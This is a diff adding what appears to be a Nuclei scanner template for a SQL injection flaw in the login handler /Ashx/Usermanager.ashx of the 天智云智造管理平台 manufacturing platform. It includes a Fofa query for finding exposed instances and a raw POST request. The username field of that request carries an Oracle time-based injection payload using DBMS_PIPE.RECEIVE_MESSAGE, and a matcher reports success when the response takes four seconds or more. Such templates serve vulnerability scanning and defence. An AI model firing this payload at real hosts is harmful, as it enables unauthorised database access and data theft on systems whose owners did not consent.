@@ -1,0 +1,31 @@
+id: tzyun_Usermanager_SQL_injected
+
+info:
+  name: tzyun_Usermanager_SQL_injected
+  author: HK
+  severity: high
+  description: 天智云智造管理平台/Ashx/Usermanager.ashx存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="Ashx/Usermanager.ashx"
+    verified: true
+
+http:
+- raw:
+  - |
+    @timeout: 30s
+    POST /Ashx/Usermanager.ashx HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+    X-Requested-With: XMLHttpRequest
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 133
+
+    type=LOGIN&username=11') AND 3603=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(100)||CHR(72)||CHR(107),4) AND ('WTiY'='WTiY&pwd=1&vendor=
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
